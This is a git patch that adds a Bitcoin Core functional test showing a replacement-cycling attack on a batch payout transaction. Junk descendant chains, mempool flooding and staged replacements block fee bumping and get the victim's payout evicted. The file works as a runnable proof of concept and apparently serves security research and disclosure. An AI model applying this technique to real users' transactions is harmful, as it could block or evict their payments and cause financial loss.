@@ -1,0 +1,504 @@
+From 38be87d12b2f582ca895a92f4dbfc8d6c978152d Mon Sep 17 00:00:00 2001
+From: Antoine Riard <dev@ariard.me>
+Date: Mon, 16 Oct 2023 02:26:41 +0100
+Subject: [PATCH] Add replacement cycling batch payout
+
+---
+ .../mempool_replacement_cycling_payout.py     | 485 ++++++++++++++++++
+ 1 file changed, 485 insertions(+)
+ create mode 100755 test/functional/mempool_replacement_cycling_payout.py
+
+diff --git a/test/functional/mempool_replacement_cycling_payout.py b/test/functional/mempool_replacement_cycling_payout.py
+new file mode 100755
+index 0000000000..2829a14797
+--- /dev/null
++++ b/test/functional/mempool_replacement_cycling_payout.py
+@@ -0,0 +1,485 @@
++#!/usr/bin/env python3
++# Copyright (c) 2023 The Bitcoin Core developers
++# Distributed under the MIT software license, see the accompanying
++# file COPYING or http://www.opensource.org/licenses/mit-license.php.
++
++"""Test replacement cyling attacks against batch payout transactions"""
++
++from test_framework.key import (
++        ECKey
++)
++
++from test_framework.messages import (
++        CTransaction,
++        CTxIn,
++        CTxInWitness,
++        CTxOut,
++        COutPoint,
++        sha256,
++        COIN,
++        tx_from_hex,
++)
++
++from test_framework.util import (
++        assert_equal,
++        assert_greater_than,
++        gen_return_txouts,
++        create_lots_of_big_transactions,
++        assert_raises_rpc_error
++)
++
++from test_framework.script import (
++        CScript,
++        hash160,
++        OP_IF,
++        OP_HASH160,
++        OP_EQUAL,
++        OP_ELSE,
++        OP_ENDIF,
++        OP_CHECKSIG,
++        OP_SWAP,
++        OP_SIZE,
++        OP_NOTIF,
++        OP_DROP,
++        OP_CHECKMULTISIG,
++        OP_EQUALVERIFY,
++        OP_0,
++        OP_2,
++        OP_RETURN,
++        OP_TRUE,
++        SegwitV0SignatureHash,
++        SIGHASH_ALL,
++        SIGHASH_SINGLE,
++        SIGHASH_ANYONECANPAY,
++)
++
++from decimal import Decimal
++
++from test_framework.test_framework import BitcoinTestFramework
++
++from test_framework.wallet import MiniWallet
++
++def generate_payout_transaction(wallet, coin, input_amount, sat_per_vbyte, nSequence):
++
++    payout_output_script = CScript([OP_TRUE])
++    payout_output_scriptpubkey = CScript([OP_0, sha256(payout_output_script)])
++    payout_amount = 10000000
++
++    payout_tx_fee = 534 * sat_per_vbyte
++    payout_tx = CTransaction()
++    payout_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b"", nSequence))
++
++    payout_tx.vout.append(CTxOut(int(input_amount - payout_tx_fee - 10 * payout_amount), payout_output_scriptpubkey))
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 1
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 2
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 3
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 4
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 5
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 6
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 7
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 8
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 9
++    payout_tx.vout.append(CTxOut(payout_amount, payout_output_scriptpubkey)) # Payout 10
++    payout_tx.rehash()
++
++    wallet.sign_tx(payout_tx)
++
++    return payout_tx
++
++def generate_single_tx(wallet, coin, input_amount, sat_per_vbyte, nSequence):
++
++    single_tx_output_script = CScript([OP_TRUE])
++    single_tx_output_scriptpubkey = CScript([OP_0, sha256(single_tx_output_script)])
++
++    single_tx_output_amount = 100000
++
++    single_tx_fee = 190 * sat_per_vbyte
++    single_tx = CTransaction()
++    single_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b"", nSequence))
++
++    single_tx.vout.append(CTxOut(int(input_amount - single_tx_fee - 2 * single_tx_output_amount), single_tx_output_scriptpubkey))
++    single_tx.vout.append(CTxOut(int(single_tx_output_amount), single_tx_output_scriptpubkey))
++    single_tx.vout.append(CTxOut(int(single_tx_output_amount), single_tx_output_scriptpubkey))
++    single_tx.rehash()
++
++    wallet.sign_tx(single_tx)
++
++    return single_tx
++
++def generate_big_single_tx(wallet, coin, input_amount, sat_per_vbyte, nSequence):
++
++    single_tx_output_script = CScript([OP_TRUE])
++    single_tx_output_scriptpubkey = CScript([OP_0, sha256(single_tx_output_script)])
++
++    opreturn_scriptpubkey = CScript([OP_RETURN, b'\x01'*67437])
++
++    single_tx_output_amount = 100000
++
++    single_tx_fee = 190 * sat_per_vbyte
++    single_tx = CTransaction()
++    single_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b"", nSequence))
++
++    single_tx.vout.append(CTxOut(int(input_amount - single_tx_fee), single_tx_output_scriptpubkey))
++    single_tx.vout.append(CTxOut(int(0), opreturn_scriptpubkey))
++    single_tx.rehash()
++
++    wallet.sign_tx(single_tx)
++
++    return single_tx
++
++
++def generate_child_tx_multiple_parent(parent_txid, parent_vout, input_amount, sat_per_vbyte, nSequence, second_parent_txid, second_parent_vout, second_parent_amount):
++
++    child_output_script = CScript([OP_TRUE])
++    child_output_scriptpubkey = CScript([OP_0, sha256(child_output_script)])
++
++    # Overpaid a bit in fees.
++    child_tx_fee = 316 * sat_per_vbyte
++
++    child_tx = CTransaction()
++    child_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), parent_vout), b"", nSequence))
++    child_tx.vin.append(CTxIn(COutPoint(int(second_parent_txid, 16), second_parent_vout), b"", nSequence))
++    child_tx.vout.append(CTxOut(int(input_amount + second_parent_amount - child_tx_fee), child_output_scriptpubkey))
++
++    child_tx.wit.vtxinwit.append(CTxInWitness())
++    child_tx.wit.vtxinwit[0].scriptWitness.stack = [child_output_script]
++
++    child_tx.wit.vtxinwit.append(CTxInWitness())
++    child_tx.wit.vtxinwit[1].scriptWitness.stack = [child_output_script]
++
++    child_tx.rehash()
++
++    return child_tx
++
++def generate_child_tx_three_parent(parent_txid, parent_vout, input_amount, third_parent_txid, third_parent_vout, third_parent_amount, sat_per_vbyte, nSequence, second_parent_txid, second_parent_vout, second_parent_amount):
++
++    child_output_script = CScript([OP_TRUE])
++    child_output_scriptpubkey = CScript([OP_0, sha256(child_output_script)])
++
++    # Overpaid a bit in fees.
++    child_tx_fee = 316 * sat_per_vbyte
++
++    child_tx = CTransaction()
++    child_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), parent_vout), b"", nSequence))
++    child_tx.vin.append(CTxIn(COutPoint(int(third_parent_txid, 16), third_parent_vout), b"", nSequence))
++    child_tx.vin.append(CTxIn(COutPoint(int(second_parent_txid, 16), second_parent_vout), b"", nSequence))
++    child_tx.vout.append(CTxOut(int(input_amount + second_parent_amount + third_parent_amount - child_tx_fee), child_output_scriptpubkey))
++
++    child_tx.wit.vtxinwit.append(CTxInWitness())
++    child_tx.wit.vtxinwit[0].scriptWitness.stack = [child_output_script]
++
++    child_tx.wit.vtxinwit.append(CTxInWitness())
++    child_tx.wit.vtxinwit[1].scriptWitness.stack = [child_output_script]
++
++    child_tx.wit.vtxinwit.append(CTxInWitness())
++    child_tx.wit.vtxinwit[2].scriptWitness.stack = [child_output_script]
++
++    child_tx.rehash()
++
++    return child_tx
++
++def generate_child_tx_single_parent(parent_txid, parent_vout, input_amount, sat_per_vbyte, nSequence):
++
++    child_output_script = CScript([OP_TRUE])
++    child_output_scriptpubkey = CScript([OP_0, sha256(child_output_script)])
++
++    # Overpaid a bit in fees.
++    child_tx_fee = 316 * sat_per_vbyte
++
++    child_tx = CTransaction()
++    child_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), parent_vout), b"", nSequence))
++    child_tx.vout.append(CTxOut(int(input_amount - child_tx_fee), child_output_scriptpubkey))
++
++    child_tx.wit.vtxinwit.append(CTxInWitness())
++    child_tx.wit.vtxinwit[0].scriptWitness.stack = [child_output_script]
++
++    child_tx.rehash()
++
++    return child_tx
++
++def generate_chain_junk_tx(parent_txid, parent_vout, input_amount, sat_per_vbyte, nSequence, number_of_junk, second_parent_txid, second_parent_vout, second_input_amount):
++
++    junk_txn = []
++
++    junk_output_script = CScript([OP_TRUE])
++    junk_output_scriptpubkey = CScript([OP_0, sha256(junk_output_script)])
++
++    # Overpaid a bit in fees.
++    junk_tx_fee = 316 * sat_per_vbyte
++
++    first_junk_tx = CTransaction()
++    first_junk_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), parent_vout), b"", nSequence))
++    first_junk_tx.vin.append(CTxIn(COutPoint(int(second_parent_txid, 16), second_parent_vout), b"", nSequence))
++    first_junk_tx.vout.append(CTxOut(int(input_amount + second_input_amount - junk_tx_fee), junk_output_scriptpubkey))
++
++    first_junk_tx.wit.vtxinwit.append(CTxInWitness())
++    first_junk_tx.wit.vtxinwit[0].scriptWitness.stack = [junk_output_script]
++
++    first_junk_tx.wit.vtxinwit.append(CTxInWitness())
++    first_junk_tx.wit.vtxinwit[1].scriptWitness.stack = [junk_output_script]
++
++    first_junk_tx.rehash()
++    parent_txid = first_junk_tx.hash
++    next_input_amount = input_amount + second_input_amount- junk_tx_fee
++
++    junk_txn.append(first_junk_tx)
++
++    for i in range(0, number_of_junk):
++
++        junk_tx = CTransaction()
++        junk_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), 0), b"", nSequence))
++        junk_tx.vout.append(CTxOut(int(next_input_amount - junk_tx_fee), junk_output_scriptpubkey))
++
++        junk_tx.wit.vtxinwit.append(CTxInWitness())
++        junk_tx.wit.vtxinwit[0].scriptWitness.stack = [junk_output_script]
++
++        junk_tx.rehash()
++
++        junk_txn.append(junk_tx)
++
++        parent_txid = junk_tx.hash
++        next_input_amount = next_input_amount - junk_tx_fee
++
++    return junk_txn
++
++class ReplacementCyclingBatchPayoutTest(BitcoinTestFramework):
++
++    def set_test_params(self):
++        self.num_nodes = 1
++   
++        self.node0_args = ["-datacarriersize=100000", "-maxmempool=5"]
++
++        self.extra_args = [self.node0_args]
++
++    def fill_mempool(self, node, wallet, num_of_batches, tx_batch_size):
++        self.log.info("Fill the mempool until eviction is triggered and the mempoolminfee rises")
++        txouts = gen_return_txouts()
++        relayfee = node.getnetworkinfo()['relayfee']
++
++        #tx_to_be_evicted_id = miniwallet.send_self_transfer(from_node=node, fee_rate=relayfee)["txid"]
++
++        # Increase the tx fee rate to give the subsequent transactions a higher priority in the mempool
++        # The tx has an approx. vsize of 65k, i.e. multiplying the previous fee rate (in sats/kvB)
++        # by 130 should result in a fee that corresponds to 2x of that fee rate
++        base_fee = relayfee * 130
++
++        self.log.info("Fill up the mempool with txs with higher fee rate")
++        with node.assert_debug_log(["rolling minimum fee bumped"]):
++            for batch_of_txid in range(num_of_batches):
++                fee = (batch_of_txid + 1) * base_fee
++
++                txids = []
++                for _ in range(tx_batch_size):
++                    tx = wallet.create_self_transfer(
++                        fee=fee
++                    )["tx"]
++                    tx.vout.extend(txouts)
++                    res = node.testmempoolaccept([tx.serialize().hex()])[0]
++
++                    assert_equal(res['fees']['base'], fee)
++                    txids.append(node.sendrawtransaction(tx.serialize().hex()))
++
++        self.log.info("Filling up the mempool done")
++
++        self.log.info("Check that mempoolminfee is larger than minrelaytxfee")
++        assert_equal(node.getmempoolinfo()['minrelaytxfee'], Decimal('0.00001000'))
++        assert_greater_than(node.getmempoolinfo()['mempoolminfee'], Decimal('0.00001000'))
++
++        mempoolminfee = node.getmempoolinfo()['mempoolminfee']
++        self.log.info("Mempoolminfee is {}".format(mempoolminfee))
++
++    def test_replacement_cycling_batch_payout(self):
++        alice = self.nodes[0]
++
++        self.generate(alice, 501)
++
++        self.sync_all()
++
++        wallet = self.wallet
++
++        self.generate(wallet, 501)
++
++        maxmempool = alice.getmempoolinfo()["maxmempool"]
++
++        self.log.info("Configured maxmempool size {}".format(maxmempool))
++
++        coin_1 = self.wallet.get_utxo()
++
++        # Generate a batch transaction with 10-payout at 1 sat / vbyte
++        batch_payout_tx = generate_payout_transaction(wallet, coin_1, 50 * COIN, 1, 0)
++
++        batch_payout_txid = alice.sendrawtransaction(hexstring=batch_payout_tx.serialize().hex(), maxfeerate=0)
++
++        self.sync_all()
++
++        assert batch_payout_txid in alice.getrawmempool()
++
++        batch_payout_entry = alice.getmempoolentry(batch_payout_txid)
++
++        self.log.info("Batch payout entry {}".format(batch_payout_entry))
++
++        coin_2 = self.wallet.get_utxo()
++
++        unconfirmed_one_tx = generate_single_tx(wallet, coin_2, 3.125 * COIN, 8, 0)
++        unconfirmed_one_txid = alice.sendrawtransaction(hexstring=unconfirmed_one_tx.serialize().hex(), maxfeerate=0)
++
++        assert unconfirmed_one_txid in alice.getrawmempool()
++
++        self.sync_all()
++
++        child_junk_txn = generate_chain_junk_tx(batch_payout_txid, 1, 10000000, 5, 0, 22, unconfirmed_one_txid, 0, 3.125 * COIN - (190 * 8) - (100000 * 2)) # Consumed amounts from 2 transactions.
++
++        ret_txid = []
++
++        counter = 0
++        for tx in child_junk_txn:
++            txid = alice.sendrawtransaction(hexstring=tx.serialize().hex(), maxfeerate=0)
++            ret_txid.append(txid)
++
++        for txid in ret_txid:
++            assert txid in alice.getrawmempool()
++
++        # Check the number of transactions in mempool - 25
++        assert_equal(len(alice.getrawmempool()), 25)
++
++        coin_3 = self.wallet.get_utxo()
++
++        unconfirmed_two_tx = generate_single_tx(wallet, coin_3, 3.125 * COIN, 8, 0)
++        unconfirmed_two_txid = alice.sendrawtransaction(hexstring=unconfirmed_two_tx.serialize().hex(), maxfeerate=0)
++
++        assert unconfirmed_two_txid in alice.getrawmempool()
++
++        payout_child_tx_1 = generate_child_tx_multiple_parent(batch_payout_txid, 2, 10000000, 5, 0, unconfirmed_two_txid, 1, 100000)
++        payout_child_txid_1 = alice.sendrawtransaction(hexstring=payout_child_tx_1.serialize().hex(), maxfeerate=0)
++
++        assert payout_child_txid_1 in alice.getrawmempool()
++
++        payout_child_tx = generate_child_tx_single_parent(batch_payout_txid, 3, 100000, 10, 0)
++        payout_child_txid_2 = alice.sendrawtransaction(hexstring=payout_child_tx.serialize().hex(), maxfeerate=0)
++
++        assert payout_child_txid_2 in alice.getrawmempool()
++
++        # Check we reach carve-out exemption, even if better child feerate.
++        one_more_payout_child_tx = generate_child_tx_single_parent(batch_payout_txid, 4, 100000, 10, 0)
++
++        assert_raises_rpc_error(-26, "too many descendants", alice.sendrawtransaction, one_more_payout_child_tx.serialize().hex(), 0)
++
++        self.log.info("Mempool number of transactions {}".format(len(alice.getrawmempool())))
++        ## We reach the limit of building a chain of 25 transactions in the mempool + 1 one more for carve-out exemptions.
++        assert_equal(len(alice.getrawmempool()), 28)
++
++        tx_batch_size = 1
++        num_of_batches = 75
++
++        # We flood the mempool until mempool min fee bumped.
++        self.fill_mempool(alice, wallet, num_of_batches, tx_batch_size)
++
++        self.log.info("Mempool number of transactions {}".format(len(alice.getrawmempool())))
++        assert_equal(len(alice.getrawmempool()), 100)
++
++        assert batch_payout_txid in alice.getrawmempool()
++        assert unconfirmed_two_txid in alice.getrawmempool()
++        assert payout_child_txid_1 in alice.getrawmempool()
++        assert payout_child_txid_2 in alice.getrawmempool()
++
++        counter = 0
++        for txid in ret_txid:
++            assert txid in alice.getrawmempool()
++            counter += 1
++
++        # The junk child are still present after the flooding
++        assert_equal(counter, 23)
++
++        # We build a RBF replacement of batch payout txid.
++        batch_payout_replacement_tx = generate_payout_transaction(wallet, coin_1, 50 * COIN, 10, 0)
++
++        assert_raises_rpc_error(-26, "less fees than conflicting txs", alice.sendrawtransaction, batch_payout_replacement_tx.serialize().hex(), 0)
++
++        self.log.info("Batch payout transaction RBF is pinned")
++
++        # We build a CPFP of the batch payout txid.
++        payout_child_pay_for_parent_tx = generate_child_tx_single_parent(batch_payout_txid, 4, 100000, 10, 0)
++
++        assert_raises_rpc_error(-26, "too many descendants", alice.sendrawtransaction, payout_child_pay_for_parent_tx.serialize().hex(), 0)
++
++        self.log.info("Batch payout transaction CPFP is blocked")
++
++        # Check the number of mempool transaction is still the same
++        assert_equal(len(alice.getrawmempool()), 100)
++
++        assert batch_payout_txid in alice.getrawmempool()
++        assert unconfirmed_two_txid in alice.getrawmempool()
++        assert payout_child_txid_1 in alice.getrawmempool()
++        assert payout_child_txid_2 in alice.getrawmempool()
++
++        counter = 0
++        for txid in ret_txid:
++            assert txid in alice.getrawmempool()
++            counter += 1
++
++        # The junk child are still present after the flooding
++        assert_equal(counter, 23)
++
++        # We generate a replacement for unconfirmed ancestor one.
++        unconfirmed_one_replacement_tx = generate_single_tx(wallet, coin_2, 3.125 * COIN, 1000, 0)
++        unconfirmed_one_replacement_txid = alice.sendrawtransaction(hexstring=unconfirmed_one_replacement_tx.serialize().hex(), maxfeerate=0)
++
++        assert_equal(len(alice.getrawmempool()), 77)
++
++        counter = 0
++        for txid in ret_txid:
++            assert not txid in alice.getrawmempool()
++            counter += 1
++
++        ## The junk child are not present anymore after the replacement.
++        assert_equal(counter, 23)
++
++        # We build a replacement for the two payout child still present.
++        assert batch_payout_txid in alice.getrawmempool()
++        assert payout_child_txid_1 in alice.getrawmempool()
++        assert payout_child_txid_2 in alice.getrawmempool()
++
++        payout_child_replacement_tx = generate_child_tx_three_parent(batch_payout_txid, 2, 10000000, batch_payout_txid, 3, 1000000, 30000, 0, unconfirmed_two_tx.hash, 1, 100000)
++        payout_child_replacement_txid = alice.sendrawtransaction(hexstring=payout_child_replacement_tx.serialize().hex(), maxfeerate=0)
++
++        assert_equal(len(alice.getrawmempool()), 76)
++
++        assert batch_payout_txid in alice.getrawmempool()
++        assert payout_child_replacement_txid in alice.getrawmempool()
++        assert not payout_child_txid_1 in alice.getrawmempool()
++        assert not payout_child_txid_2 in alice.getrawmempool()
++
++        unconfirmed_two_replacement_tx = generate_single_tx(wallet, coin_3, 3.125 * COIN, 1000000, 0)
++        unconfirmed_two_replacement_txid = alice.sendrawtransaction(hexstring=unconfirmed_two_replacement_tx.serialize().hex(), maxfeerate=0)
++
++        # We evicted the payout_child_replacement_txid
++        assert_equal(len(alice.getrawmempool()), 75)
++
++        assert unconfirmed_two_replacement_txid in alice.getrawmempool()
++        assert not payout_child_replacement_txid in alice.getrawmempool()
++
++        assert batch_payout_txid in alice.getrawmempool()
++
++        coin_4 = self.wallet.get_utxo()
++
++        new_transaction = generate_big_single_tx(wallet, coin_4, 3.125 * COIN, 10000, 0)
++        new_transaction_id = alice.sendrawtransaction(hexstring=new_transaction.serialize().hex(), maxfeerate=0)
++
++        assert new_transaction_id in alice.getrawmempool()
++        assert not batch_payout_txid in alice.getrawmempool()
++
++        assert_raises_rpc_error(-5, "Transaction not in mempool", alice.getmempoolentry, batch_payout_txid)
++
++        # We evicted a flooding tx and batch payout txid.
++        assert_equal(len(alice.getrawmempool()), 74)
++
++        self.log.info("Batch payout transaction has been trimmed out of the mempool by third-party broadcast")
++
++
++    def run_test(self):
++        self.wallet = MiniWallet(self.nodes[0])
++
++        self.test_replacement_cycling_batch_payout()
++
++if __name__ == '__main__':
++    ReplacementCyclingBatchPayoutTest().main()
+-- 
+2.40.0
+
